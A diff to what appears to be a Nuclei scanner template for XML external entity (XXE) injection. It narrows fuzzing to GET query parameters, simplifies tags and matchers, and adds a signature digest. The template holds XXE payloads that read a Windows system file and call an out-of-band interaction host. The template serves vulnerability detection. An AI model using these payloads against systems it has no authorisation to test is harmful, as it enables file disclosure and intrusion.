@@ -6,7 +6,9 @@ info:
   severity: medium
   reference:
     - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
-  tags: fuzzing-req-query,xxe,dast,fuzzing-req-xxe,fuzzing-req-body
+  metadata:
+    max-request: 2
+  tags: dast,xxe
 
 variables:
   rletter: "{{rand_base(6,'abc')}}"
@@ -15,10 +17,8 @@ http:
   - pre-condition:
       - type: dsl
         dsl:
-          - 'method != "OPTIONS"'
-          - '!contains(path, ".js")'  # exclude .js files
-        condition: and
-        
+          - 'method == "GET"'
+
     payloads:
       xxe:
         - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini"> ]><x>&{{rletter}};</x>'
@@ -26,7 +26,7 @@ http:
         - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "http://{{interactsh-url}}"> ]><x>&{{rletter}};</x>'
 
     fuzzing:
-      - part: request
+      - part: query
         keys-regex:
           - "(.*?)xml(.*?)"
         fuzz:
@@ -39,7 +39,6 @@ http:
           - "{{xxe}}"
 
     stop-at-first-match: true
-    matchers-condition: or
     matchers:
       - type: regex
         name: linux
@@ -57,3 +56,4 @@ http:
         part: interactsh_protocol
         words:
           - "http"
+# digest: 4b0a00483046022100f4bbfc3971586034fe4acec998d83906a5475082576c1188c48196e212dd6147022100acbeef0ac9677e9e0e5665a5181eb75b9d52bd56103b81a525ba9b9c307e566c:922c64590222798bb761d5b6d8e72950
